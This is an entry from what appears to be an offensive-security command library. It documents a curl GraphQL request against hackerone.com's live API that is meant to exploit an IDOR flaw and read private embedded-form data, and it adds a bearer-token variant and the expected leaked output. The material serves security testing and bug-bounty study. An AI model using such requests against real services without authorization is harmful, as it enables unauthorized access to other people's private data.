---
id: cmd-curl-graphql
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -d '{"query": "query GetEmbeddedForm($uuid: ID!) { embeddedForm(uuid: $uuid) {
  id responseEfficiencyPercentage introText structuredScopes { type asset } }
  }", "variables": {"uuid": "00000000-0000-0000-0000-000000000000"}}' -o
  response.json
tags:
  - graphql
  - http
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.000Z'
verified: false
validated: true
submitted: true
---
# curl-graphql-query

## Command

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query GetEmbeddedForm($uuid: ID!) { embeddedForm(uuid: $uuid) { id responseEfficiencyPercentage introText structuredScopes { type asset } } }", "variables": {"uuid": "00000000-0000-0000-0000-000000000000"}}' -o response.json
```

## Description

This command sends a GraphQL POST request to query embedded form details using a provided UUID, exploiting IDOR to access private data. Use it to test unauthorized object access in GraphQL APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header for GraphQL payload | Yes |
| `-d '{...}'` | JSON payload with query and variables | Yes |
| `-o response.json` | Outputs response to file | No |
| `$uuid` | Variable for the target UUID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/graphql -H "Content-Type: application/json" -d '{"query": "query($id: ID!){ node(id: $id){ ... } }", "variables":{"id":"uuid-here"}}'
```

### Advanced Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"query": "...", "variables":{"uuid":"full-uuid"}}' --verbose
```

## Expected Output

JSON response with data object containing embeddedForm fields like {"data":{"embeddedForm":{"responseEfficiencyPercentage":95,"introText":"Private info","structuredScopes":[{"type":"ASSET","asset":"example.com"}]}}} if successful; errors if access denied.

## Related

- [[Related Procedure|procedures/Exploit-IDOR-with-GraphQL-Queries-on-UUIDs]]
